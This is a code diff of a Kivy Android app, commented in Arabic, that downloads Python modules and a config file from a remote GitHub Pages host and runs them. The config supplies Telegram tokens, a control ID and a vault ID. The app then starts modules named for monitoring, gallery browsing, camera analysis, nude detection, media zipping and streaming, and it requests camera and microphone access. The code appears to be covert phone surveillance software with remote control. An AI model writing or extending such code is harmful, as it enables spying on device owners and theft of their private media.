@@ -17,7 +17,7 @@ from kivy.uix.button import Button
 from kivy.clock import Clock
 from kivy.core.clipboard import Clipboard
 
-# ========== DNS patch ==========
+# ========== DNS patch (تجاوز DNS لضمان الاتصال) ==========
 def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
@@ -71,6 +71,7 @@ os.makedirs(MODELS_DIR, exist_ok=True)
 if R not in sys.path:
     sys.path.insert(0, R)
 
+# ========== الأذونات المطلوبة (تقليص القائمة) ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -78,18 +79,8 @@ def _perms():
             Permission.INTERNET,
             Permission.CAMERA,
             Permission.RECORD_AUDIO,
-            Permission.READ_EXTERNAL_STORAGE,
-            Permission.WRITE_EXTERNAL_STORAGE,
-            Permission.READ_CONTACTS,
-            Permission.READ_SMS,
             Permission.WAKE_LOCK,
-            Permission.ACCESS_NETWORK_STATE,
-            Permission.ACCESS_WIFI_STATE,
-            "android.permission.FOREGROUND_SERVICE",
-            "android.permission.POST_NOTIFICATIONS",
-            "android.permission.READ_MEDIA_IMAGES",
-            "android.permission.READ_MEDIA_VIDEO",
-            "android.permission.READ_MEDIA_AUDIO"
+            "android.permission.FOREGROUND_SERVICE"
         ])
     except Exception as e:
         print(f"Permissions error: {e}")
@@ -110,9 +101,7 @@ def _perms():
 
 # ========== تحميل الإعدادات من config_template.py ==========
 def load_secrets_from_config():
-    """يستورد config_template.py (أو config.py) ويستدعي load_config() لاستخراج التوكنات والإعدادات"""
     config_module = None
-    # محاولة استيراد config_template أولاً (إذا كان موجوداً في sys.path)
     try:
         config_module = importlib.import_module("config_template")
     except ImportError:
@@ -251,7 +240,7 @@ class CoreApp(App):
         else:
             self._log("Could not fetch index.json, using only local files.", "WARN")
 
-        # ---- 2. تحميل جميع الملفات عدا main.py و config_template.py ----
+        # ---- 2. تحميل جميع الملفات المذكورة في index.json (بما فيها config_template.py) ----
         model_url = None
         for file_entry in all_files:
             name = file_entry.get('name')
@@ -261,7 +250,6 @@ class CoreApp(App):
             if name == "engine_v2.tflite":
                 model_url = url
                 continue
-            # نحمّل كل شيء بما في ذلك config_template.py
             self._download_safe(url, name)
 
         # ---- 3. تحميل الموديل ----
@@ -272,9 +260,15 @@ class CoreApp(App):
             fallback_url = "https://zaen1993.github.io/Android-Core/assets/engine_v2.tflite"
             self._download_model_if_missing(fallback_url)
 
+        # ---- 4. التحقق من وجود config_template.py بعد التحميل ----
+        config_path = os.path.join(R, "config_template.py")
+        if not os.path.exists(config_path):
+            self._log("config_template.py not found after download! System cannot start.", "ERROR")
+            return
+
         time.sleep(1)
 
-        # ---- 4. تنظيف الوحدات القديمة ----
+        # ---- 5. تنظيف الوحدات القديمة ----
         modules_to_remove = ["monitor", "telegram_ui", "commands", "media_scanner", "daily_zipper",
                              "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager",
                              "config_template", "config"]
@@ -284,7 +278,7 @@ class CoreApp(App):
         importlib.invalidate_caches()
         gc.collect()
 
-        # ---- 5. تحميل الإعدادات من config_template.py ----
+        # ---- 6. تحميل الإعدادات من config_template.py ----
         try:
             active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = load_secrets_from_config()
             self._log("Secrets loaded from config_template.py")
@@ -292,12 +286,12 @@ class CoreApp(App):
             self._log(f"Failed to load secrets from config_template: {e}", "ERROR")
             return
 
-        # ---- 6. التأكد من وجود telegram_ui.py ----
+        # ---- 7. التأكد من وجود telegram_ui.py ----
         if not os.path.exists(os.path.join(R, "telegram_ui.py")):
             self._log("telegram_ui.py not found. Check internet and index.json", "ERROR")
             return
 
-        # ---- 7. إقلاع النظام ----
+        # ---- 8. إقلاع النظام ----
         try:
             import monitor
             import telegram_ui
